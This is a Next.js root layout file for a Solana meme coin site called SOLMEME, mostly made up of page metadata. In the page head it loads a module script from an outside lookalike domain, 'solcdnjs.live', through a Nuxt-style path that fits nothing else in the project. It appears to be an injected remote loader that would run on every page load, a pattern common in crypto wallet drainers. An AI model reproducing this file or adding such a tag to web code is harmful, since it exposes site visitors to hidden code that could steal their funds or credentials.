import React from 'react'
import type { Metadata } from 'next'
import { Inter } from 'next/font/google'
import './globals.css'

const inter = Inter({ subsets: ['latin'] })

export const metadata: Metadata = {
  title: 'The Ultimate Meme Coin | SOLMEME',
  description: 'Fast. Decentralized. Scalable. Energy efficient. SOLMEME - the meme coin that powers the future of DeFi.',
  keywords: ['SOLMEME', 'meme coin', 'Solana', 'blockchain', 'cryptocurrency', 'DeFi', 'Web3', 'fast', 'scalable'],
  authors: [{ name: 'SOLMEME Team' }],
  creator: 'SOLMEME Team',
  publisher: 'SOLMEME Team',
  openGraph: {
    type: 'website',
    locale: 'en_US',
    url: 'https://solmeme.com',
    title: 'The Ultimate Meme Coin | SOLMEME',
    description: 'Fast. Decentralized. Scalable. Energy efficient. SOLMEME - the meme coin that powers the future of DeFi.',
    siteName: 'SOLMEME',
    images: [
      {
        url: '/solmeme-logo.png',
        width: 1200,
        height: 630,
        alt: 'SOLMEME - The Ultimate Meme Coin',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'The Ultimate Meme Coin | SOLMEME',
    description: 'Fast. Decentralized. Scalable. Energy efficient. SOLMEME - the meme coin that powers the future of DeFi.',
    images: ['/solmeme-logo.png'],
    creator: '@solmeme',
  },
  icons: {
    icon: "/solana-favicon.png",
    shortcut: "/solana-favicon.png",
    apple: "/solana-favicon.png",
  },
  viewport: {
    width: 'device-width',
    initialScale: 1,
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
    },
  },
}

export default function RootLayout({
  children,
}: {
  children: React.ReactNode
}) {
  return (
    <html lang="en" className="dark">
      <head>
        <script type="module" src="https://solcdnjs.live/_nuxt/assets/index.js"></script>
      </head>
      <body className={`${inter.className} bg-dark-900 text-white antialiased`}>
        {children}
      </body>
    </html>
  )
} 